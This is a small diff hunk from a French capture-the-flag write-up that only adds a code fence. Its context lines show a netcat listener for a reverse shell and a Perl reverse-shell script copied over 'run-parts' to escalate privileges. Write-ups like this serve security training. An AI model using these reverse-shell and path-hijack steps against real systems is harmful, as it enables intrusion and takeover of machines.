@@ -182,7 +182,7 @@ root@Host-001:~/Bureau# nc -v -n -l -p 1234
 ~~~
 
 Sur le serveur, renommer et envoyer le shell dans /usr/local
-
+~~~
 jkr@writeup:~$ ls
 perl-reverse-shell.pl  user.txt
 jkr@writeup:~$ cp perl-reverse-shell.pl run-parts
